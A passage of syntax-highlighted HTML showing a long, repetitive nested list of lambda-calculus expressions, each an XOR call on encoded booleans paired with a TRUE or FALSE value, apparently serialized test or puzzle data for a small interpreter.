class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span 